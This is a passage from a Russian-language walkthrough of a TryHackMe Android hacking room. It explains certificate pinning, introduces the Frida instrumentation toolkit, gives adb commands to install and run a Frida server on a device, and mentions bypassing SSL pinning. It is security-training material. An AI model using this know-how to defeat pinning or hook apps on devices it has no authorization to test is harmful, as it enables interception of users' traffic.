Это метод, который мы используем на стороне клиента, чтобы избежать атаки типа «человек посередине» путем повторной 
проверки сертификатов сервера даже после установления связи SSL. Разработчики встраивают (или закрепляют) список 
доверенных сертификатов в клиентское приложение во время разработки и используют их для сравнения с сертификатами 
сервера во время выполнения. Если есть несоответствие между сервером и локальной копией сертификатов, соединение 
просто будет прервано, и никакие дальнейшие пользовательские данные даже не будут отправлены на этот сервер. Такое 
принудительное применение гарантирует, что пользовательские устройства будут обмениваться данными только с 
выделенными доверенными серверами.


После того, как вы рассмотрели иллюстрацию выше, обратите внимание, что закрепление сертификата пытается 
гарантировать, что клиент не обменивается сообщениями ни с каким другим сервером, кроме того, для которого у него 
есть открытый ключ. Таким образом, клиент не подвергается атакам, когда мошеннический центр сертификации (CA) 
проверяет подлинность вредоносного хоста, обслуживающего контент с помощью поддельного сертификата.

`если(устройства && эмуляторы = CA_BURPSUITE):
    распечатать "не перехватывать сообщения ):"
еще:
    распечатать "Приложение найдено"`

### Ответьте на вопросы ниже
```commandline
Ответ не нужен
```

## Задание 10
Приложения для подключения:

Методы, используемые для изменения поведения приложений. 

Фрида

Короче говоря, это динамическая инструментальная среда, которая позволяет подключать функции и предоставлять им 
определение во время выполнения. По сути, она внедряет код JavaScript в процесс. Предположим, что в программе есть 
функция с именем «foo» с определенным телом/реализацией. Используя «Frida», можно изменить тело/реализацию функции 
«foo» во время выполнения. «Frida» поддерживает различные платформы, такие как Windows, macOS, GNU/ Linux , iOS, 
Android и QNX. Более подробную информацию о «Frida» можно найти здесь.

для установки `pip install frida-tools`
Теперь проверьте версию и скачайте сервер, в моем случае это 12.6.8
`frida --version`
распакуйте файл и поместите его на сервер в локальной системе /data/local/tmp
`adb push /path/serverfrida /data/local/tmp`
Разрешения
`adb shell chmod 777 /data/local/tmp/frida-server`
запустить сервер фрида
`adb shell /data/local/tmp/frida-имя_сервера&`
теперь выполните в командной строке `frida-ps -U`

Обход SSL-закрепления. Руководство

Больше крючков :v - твоя миссия :33 

### Ответьте на вопросы ниже
```commandline
Ответ не нужен
```
## Задание 11
Это базовое введение в то, что такое взлом Android. Приложения в CTF намного сложнее, чем реальные приложения.

Вопросы? 

В дискорде: stuxnet, в твиттере: _stuxnet, телеграме: stuxnet

Хотите узнать больше? 

Проверьте это

Owasp Мобильный Топ 10 

Руководство по тестированию безопасности мобильных устройств (MSTG)

Мобильная безопасность Twitter

Увидимся в другой раз! Удачи, хакер. 

Старайтесь усерднее! 

### Ответьте на вопросы ниже

```commandline
Ответ не нужен
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)